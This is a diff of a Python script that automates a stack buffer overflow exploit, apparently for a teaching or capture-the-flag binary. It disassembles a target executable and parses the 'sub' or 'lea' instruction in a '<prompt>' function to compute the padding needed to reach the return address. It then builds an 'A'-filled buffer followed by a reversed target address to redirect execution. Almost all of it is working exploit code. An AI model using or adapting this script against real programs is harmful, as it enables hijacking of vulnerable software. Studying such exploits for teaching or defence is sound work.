@@ -31,16 +31,31 @@ def get_buffer_size():
 	cat_proc = Popen(["cat", TMP_FILE], stdout=PIPE)
 	grep_proc = Popen(["grep", "-n", "<prompt>:"], stdin=cat_proc.stdout, stdout=PIPE)
 
-	# Sed reads at specific line
+	# We only need the LEA code as it will tell us how many bytes were alloc
+	# for our array (plus 8)
 	start = int(grep_proc.communicate()[0].decode("utf-8").split(":")[0])
-	start_str = "{}q;d".format(start+3)
-	sed_proc = Popen(["sed", start_str, TMP_FILE], stdout=PIPE)	
+	start_str = "{}q;d".format(start+5)
+	sed_proc = Popen(["sed", start_str, TMP_FILE], stdout=PIPE)
 
-	buff_size = sed_proc.communicate()[0].decode("utf-8")
-	buff_size = buff_size.split("sub    $")[-1]
-	buff_size = buff_size.split(",")[0]
-	buff_size = int(buff_size, 16) - 0x8
+	assem_array = sed_proc.communicate()[0].decode("utf-8")
+	assem_array = assem_array.split("\n")
 
+	offset = _get_buff_assem(assem_array[0])
+	
+	# ArrayAlloc - 8 = ArraySize
+	# ArraySize + 12 = # of A's needed to get to the RET addr
+	# for our exploit :)
+	return (offset - 0x8) + 0xc
+
+def _get_buff_assem(assem_input):
+	if "sub" in assem_input:
+		buff_size = assem_input.split("$")[-1]
+		buff_size = buff_size.split(",")[0]
+		buff_size = int(buff_size, 16)
+	elif "lea" in assem_input:
+		buff_size = assem_input.split("(")[0]
+		buff_size = buff_size.split("-")[-1]
+		buff_size = int(buff_size, 16)
 	return buff_size
 
 def call_exec(executable, input_buff):
@@ -49,7 +64,9 @@ def call_exec(executable, input_buff):
 def main():
 	create_obj_dump(argv[1])
 	hex_input_addr = fix_target_addr(get_target_addr())
-	a_buffer = "A" * get_buffer_size()
+	
+	buff_size = get_buffer_size()
+	a_buffer = "A" * buff_size
 	delete_obj_dump()
 
 	# Convert to byte pairs and reverse the order
@@ -63,5 +80,6 @@ def main():
 
 	# And we're done here!
 	return
+
 if __name__ == '__main__':
 	main()
